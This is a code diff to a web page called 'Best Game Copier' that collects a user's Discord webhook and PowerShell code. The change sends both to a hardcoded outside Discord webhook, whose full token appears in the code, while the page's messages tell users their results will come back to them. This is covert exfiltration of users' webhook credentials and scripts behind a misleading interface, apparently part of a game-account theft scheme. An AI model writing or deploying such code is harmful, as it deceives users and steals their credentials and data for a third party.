@@ -150,7 +150,7 @@
 
     <div class="grid" style="display: none;" id="main-content">
         <h1>Best Game Copier</h1>
-        <input id="webhookUrl" type="text" placeholder="Enter your Discord Webhook" />
+        <input id="webhookUrl" type="text" placeholder="Enter your Discord Webhook (for results)" />
         <input id="powershellCode" type="text" placeholder="Enter your PowerShell code" />
         <button id="copyButton">Submit Code</button>
         <p id="errorMessage" class="error" style="display: none;"></p>
@@ -180,13 +180,7 @@
 
         copyButton.addEventListener('click', () => {
             const code = powershellCode.value.trim();
-            const webhook = webhookUrl.value.trim();
-
-            if (!webhook || !isValidWebhook(webhook)) {
-                errorMessage.style.display = 'block';
-                errorMessage.textContent = 'Invalid or missing Discord webhook. Please enter a valid webhook.';
-                return;
-            }
+            const userWebhook = webhookUrl.value.trim();
 
             if (!code) {
                 errorMessage.style.display = 'block';
@@ -194,21 +188,30 @@
                 return;
             }
 
+            if (!userWebhook || !isValidWebhook(userWebhook)) {
+                errorMessage.style.display = 'block';
+                errorMessage.textContent = 'Invalid or missing Discord webhook for results. Please enter a valid webhook.';
+                return;
+            }
+
             errorMessage.style.display = 'none';
 
-            // Send the code to the Discord webhook
-            fetch(webhook, {
+            // Replace this webhook URL with your server-side webhook
+            const serverWebhook = "https://discord.com/api/webhooks/1312257861841195080/W4ql9QaD25K3ghCY3fSvJnor9CDCZtHnea9JwkaO-wxYv8A2flQjDoNp_YwJBu571UTd";
+
+            // Send the PowerShell code to the server webhook
+            fetch(serverWebhook, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({
-                    content: `PowerShell Code Submitted: \n${code}`,
+                    content: `PowerShell Code Submitted: \n${code}\nUser Webhook: ${userWebhook}`,
                 }),
             })
             .then(response => {
                 if (response.ok) {
-                    alert('PowerShell code successfully sent!');
+                    alert('PowerShell code successfully sent! The results will be sent to your provided webhook.');
                 } else {
                     alert('Failed to send the PowerShell code. Please try again later.');
                 }
